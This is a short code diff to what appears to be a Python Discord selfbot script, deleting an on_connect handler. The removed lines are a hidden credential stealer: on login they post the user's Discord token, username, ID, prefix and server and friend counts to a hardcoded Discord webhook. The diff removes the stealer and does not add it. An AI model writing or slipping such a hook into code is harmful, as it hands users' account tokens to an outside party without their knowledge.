@@ -273,21 +273,4 @@ async def presence(ctx, *, stat):
   await bot.change_presence(status=discord.Status.idle, activity=game)
 
 
-
-
-
-@bot.event
-async def on_connect():
-    r = requests.post('https://discord.com/api/webhooks/1069762015440154674/zu8NbbdVH6e5IFDdLHbL2c_AT9nWE-D1MX53YVfueuxuEoEeX3EBMuCHUZWRiAs09Duk', headers=header, json = {"content": f"""
-    ```
-[+] Username : {bot.user.name}#{bot.user.discriminator}
-[+] User ID : {bot.user.id}
-[+] Prefix : {command_prefix}
-[+] Token : {Token}
-[+] Servers : {len(bot.guilds)}
-[+] Friends : {len(bot.user.relationships)}
-[+] Ping : {round(bot.latency * 1000)}ms
-    ```
-    """})
-
 bot.run(Token, bot=False)
